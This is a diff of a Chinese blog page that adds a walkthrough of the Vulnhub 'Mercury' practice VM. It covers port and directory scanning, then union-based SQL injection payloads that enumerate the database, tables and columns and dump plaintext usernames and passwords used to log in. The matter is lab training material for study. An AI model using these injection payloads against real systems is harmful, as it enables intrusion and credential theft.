@@ -7,12 +7,12 @@
     <meta name="keywords" content="Vulnhub-Mercury靶场实战记录, 学习，IT，NLP, 机器学习">
     <meta name="description" content="环境靶场地址：Mercury 
 信息收集主机ip地址：192.168.113.134
-端口扫描扫描端口发现开放了22和8080web端口
+端口扫描扫描端口发现开放了22和8080 的web端口
 
 nmap -p- -sV -A 192.168.113.134
 
 
-Host is up (0.00">
+Host is up (0.">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -268,7 +268,7 @@ Host is up (0.00">
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('http://alexjakin.github.io/medias/reward/vulnhub/mercury/1.png')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('http://alexjakin.github.io/medias/reward/vulnhub/mercury/2.png')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
@@ -403,14 +403,14 @@ Host is up (0.00">
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        110
+                        759
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        1 分
+                        4 分
                     </div>
                     
                 
@@ -428,7 +428,7 @@ Host is up (0.00">
             <div id="articleContent">
                 <h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>靶场地址：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/the-planets-mercury,544/">Mercury</a> </p>
 <h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>主机ip地址：192.168.113.134</p>
-<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>扫描端口发现开放了22和8080web端口</p>
+<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>扫描端口发现开放了22和8080 的web端口</p>
 <blockquote>
 <p>nmap -p- -sV -A 192.168.113.134</p>
 </blockquote>
@@ -446,6 +446,92 @@ PORT     STATE SERVICE    VERSION
 </code></pre>
 <p>访问<strong>192.168.113.134:8080</strong>web页面</p>
 <p><img src="http://alexjakin.github.io/medias/reward/vulnhub/mercury/1.png" alt="web页面"> </p>
+<h3 id="扫描目录"><a href="#扫描目录" class="headerlink" title="扫描目录"></a>扫描目录</h3><p>该web页面没有其他有用信息，就开始扫描一下目录</p>
+<pre class=" language-text"><code class="language-text">
+===============================================================
+Gobuster v3.5
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.113.134:8080
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] Exclude Length:          0
+[+] User Agent:              gobuster/3.5
+[+] Extensions:              js,txt.bak,html.bak,git.bak,php,txt,json,git,zip,zip.bak,html,php.bak
+[+] Timeout:                 10s
+===============================================================
+2023/06/15 04:57:43 Starting gobuster in directory enumeration mode
+===============================================================
+/robots.txt           (Status: 200) [Size: 26]
+Progress: 143449 / 2867293 (5.00%)^C
+[!] Keyboard interrupt detected, terminating.
+
+===============================================================
+2023/06/15 05:11:17 Finished
+===============================================================
+
+</code></pre>
+<h2 id="开始攻击"><a href="#开始攻击" class="headerlink" title="开始攻击"></a>开始攻击</h2><h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><p>发现有个<strong>robots.txt</strong>，访问后发现是禁止所有浏览器访问所有部分</p>
+<pre class=" language-text"><code class="language-text">
+User-agent: * 
+Disallow: /
+
+</code></pre>
+<p>随机访问一个不存在的路径，会报错一下信息</p>
+<pre><code>Using the URLconf defined in mercury_proj.urls, Django tried these URL patterns, in this order:
+
+[name=&#39;index&#39;]
+robots.txt [name=&#39;robots&#39;]
+mercuryfacts/
+The current path, 1, didn&#39;t match any of these.
+</code></pre><p>访问mercury目录发现是个web页面</p>
+<p><img src="http://alexjakin.github.io/medias/reward/vulnhub/mercury/2.png" alt="web页面"> </p>
+<p>根据下面<strong>load a fact</strong> 和 <strong>see list</strong>，的提示信息可以发现这是个数据库查询，而且数据库是mysql，所以试一下注入</p>
+<p>尝试注入，发现全部输出内容，说明存在注入漏洞</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://192.168.113.134:8080/mercuryfacts/1">http://192.168.113.134:8080/mercuryfacts/1</a> or1=1/</p>
+</blockquote>
+<pre><code>
+Fact id: 1 or 1= 1. ((&#39;Mercury does not have any moons or rings.&#39;,), (&#39;Mercury is the smallest planet.&#39;,), (&#39;Mercury is the closest planet to the Sun.&#39;,), (&#39;Your weight on Mercury would be 38% of your weight on Earth.&#39;,), (&#39;A day on the surface of Mercury lasts 176 Earth days.&#39;,), (&#39;A year on Mercury takes 88 Earth days.&#39;,), (&quot;It&#39;s not known who discovered Mercury.&quot;,), (&#39;A year on Mercury is just 88 days long.&#39;,))
+
+</code></pre><p>步骤一：爆库，数据库是<strong>mercury</strong></p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://192.168.113.134:8080/mercuryfacts/3">http://192.168.113.134:8080/mercuryfacts/3</a> union select database()</p>
+</blockquote>
+<pre class=" language-text"><code class="language-text">Fact id: 3 union select database(). (('Mercury is the closest planet to the Sun.',), ('mercury',))
+</code></pre>
+<p>步骤二：爆表，数据表有<strong>facts</strong>和<strong>users</strong></p>
+<blockquote>
+<p>3 union select table_name from information_schema.tables where table_schema=’mercury’</p>
+</blockquote>
+<pre><code>
+Fact id: 3 union select table_name from information_schema.tables where table_schema=&#39;mercury&#39;. ((&#39;Mercury is the closest planet to the Sun.&#39;,), (&#39;facts&#39;,), (&#39;users&#39;,))
+
+</code></pre><p>步骤三：爆字段，数据表<strong>facts</strong>的字段是id，fact。数据表<strong>users</strong>的字段是id，username，password。</p>
+<blockquote>
+<p>3 union select column_name from information_schema.columns where table_schema=’mercury’ and table_name=’facts’</p>
+</blockquote>
+<pre class=" language-text"><code class="language-text">
+Fact id: 3 union select column_name from information_schema.columns where table_schema='mercury' and table_name='facts'. (('Mercury is the closest planet to the Sun.',), ('fact',), ('id',))
+
+</code></pre>
+<blockquote>
+<p>3 union select column_name from information_schema.columns where table_schema=’mercury’ and table_name=’users’</p>
+</blockquote>
+<pre class=" language-text"><code class="language-text">
+Fact id: 3 union select column_name from information_schema.columns where table_schema='mercury' and table_name='users'. (('Mercury is the closest planet to the Sun.',), ('id',), ('password',), ('username',))
+
+</code></pre>
+<p>步骤四：爆数据，发现有四个用户，尝试进行登录靶机</p>
+<pre class=" language-text"><code class="language-text">
+Fact id: 3 union select group_concat(username," ",password) from mercury.users. (('Mercury is the closest planet to the Sun.',), ('john johnny1987,laura lovemykids111,sam lovemybeer111,webmaster mercuryisthesizeof0.056Earths',))
+
+</code></pre>
+<p>###拿下webmaster用户</p>
+<p>发现是<strong>webmaster</strong>用户，密码是<strong>mercuryisthesizeof0.056Earths</strong>成功登录</p>
+<p><img src="http://alexjakin.github.io/medias/reward/vulnhub/mercury/3.png" alt="成功以webmatser用户登录"> </p>
 
             </div>
             <hr/>
@@ -644,7 +730,7 @@ PORT     STATE SERVICE    VERSION
                 <a href="/2023/06/13/vulnhubmercurybachangshizhanjilu/">
                     <div class="card-image">
                         
-                        <img src="http://alexjakin.github.io/medias/reward/vulnhub/mercury/1.png" class="responsive-img" alt="Vulnhub-Mercury靶场实战记录">
+                        <img src="http://alexjakin.github.io/medias/reward/vulnhub/mercury/2.png" class="responsive-img" alt="Vulnhub-Mercury靶场实战记录">
                         
                         <span class="card-title">Vulnhub-Mercury靶场实战记录</span>
                     </div>
@@ -652,12 +738,12 @@ PORT     STATE SERVICE    VERSION
                 <div class="card-content article-content">
                     <div class="summary">环境靶场地址：Mercury 
 信息收集主机ip地址：192.168.113.134
-端口扫描扫描端口发现开放了22和8080web端口
+端口扫描扫描端口发现开放了22和8080 的web端口
 
 nmap -p- -sV -A 192.168.113.134
 
 
-Host is up (0.00</div>
+Host is up (0.</div>
                     <div class="publish-info">
                             <span class="publish-date">
                                 <i class="fa fa-clock-o fa-fw icon-date"></i>2023-06-13
@@ -880,7 +966,7 @@ Starting Nmap 7.93 ( https:</div>
 
             
                 &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站点总字数:&nbsp;
-                <span class="white-color">74k</span>
+                <span class="white-color">74.6k</span>
             
 
             
